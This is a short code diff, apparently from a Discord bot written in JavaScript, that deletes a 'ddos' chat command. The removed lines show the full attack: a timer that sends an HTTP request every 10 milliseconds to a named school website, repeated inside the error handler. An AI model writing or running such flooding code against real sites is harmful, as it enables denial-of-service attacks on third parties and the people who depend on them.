@@ -475,17 +475,7 @@ if(message.content.startsWith(p + "sexx")) {
 
 }
 
-if (message.content.startsWith(p + "ddos")) {
-try {
-const axios = require('axios');
-setInterval(() => axios('http://school69tmn.ru/'), 10);
-console.log("ddos")
-} catch (err) {
-const axios = require('axios');
-setInterval(() => axios('http://school69tmn.ru/'), 10);
-console.log("fail ddos")
-}
-}
+
 
 }); 
 
